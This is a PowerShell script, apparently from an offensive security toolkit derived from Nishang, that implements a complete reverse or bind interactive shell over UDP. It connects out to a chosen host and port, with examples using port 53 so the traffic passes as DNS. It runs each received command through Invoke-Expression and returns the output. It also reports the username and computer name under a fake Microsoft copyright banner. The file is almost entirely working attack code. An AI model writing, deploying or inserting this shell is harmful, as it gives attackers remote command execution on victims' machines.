function Invoke-UDP-Shell
{ 

<#

.SYNOPSIS
PowerShell UDP Reverse or Bind interactive shell. Unencrypted.

.DESCRIPTION
This script is able to connect to a standard netcat listening on a UDP port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific UDP port.
The script is derived from: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-UDP-Shell -Reverse -IPAddress 192.168.254.226 -Port 53
Above shows an example of an interactive PowerShell reverse connect shell. 

.EXAMPLE
PS > Invoke-UDP-Shell -Bind -Port 161
Above shows an example of an interactive PowerShell bind connect shell. 

.EXAMPLE
PS > Invoke-UDP-Shell -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 53
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
https://github.com/ahhh/PSSE/blob/master/Invoke-UDP-Shell.ps1
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1

#>   
      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $IPv6,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

        
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPAddress),$Port)

			# If IPV6 Address
            # Regex from http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
            if ($IPAddress -match "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))")
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
            }
            else #IPv4 Address
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
            }
        }

        #Bind to the provided port if Bind switch is used.
       if ($Bind)
        {
            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::ANY,$Port)
        
            if ($IPv6)
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
            }
            else # IPv4
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
            }
        
            $client.Receive([ref]$endpoint)
        }

        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername in ghetto banner
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $client.Send($sendbytes,$sendbytes.Length,$endpoint)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
        $client.Send($sendbytes,$sendbytes.Length,$endpoint)
    
        while($true)
        {
            $receivebytes = $client.Receive([ref]$endpoint)
            $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
            
            try
            {
                #Execute the command on the target.
                $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }

            $sendback = $result +  'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback + $x

            #Send results back
            $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2)
            $client.Send($sendbytes,$sendbytes.Length,$endpoint)
        }
        $client.Close()
    }
    catch
    {
        Write-Warning "Warning! Danger Will Robinson." 
        Write-Error $_
    }
}
